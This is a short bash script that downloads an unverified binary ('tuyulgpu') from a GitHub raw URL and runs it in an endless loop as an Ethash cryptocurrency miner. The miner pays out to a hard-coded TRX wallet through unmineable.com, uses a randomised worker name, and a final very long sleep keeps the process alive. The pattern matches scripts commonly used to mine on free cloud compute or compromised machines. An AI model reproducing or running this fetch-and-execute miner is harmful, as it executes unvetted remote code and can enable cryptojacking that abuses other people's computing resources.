#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TQRsCTkn83oQzkLy5AZef5Z9ZGwLX619gQ
WORKER=$(echo $(shuf -i 10-40 -n 1)-COli#tin1-ibiv)
wget https://github.com/Nizz776/Nizz776/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
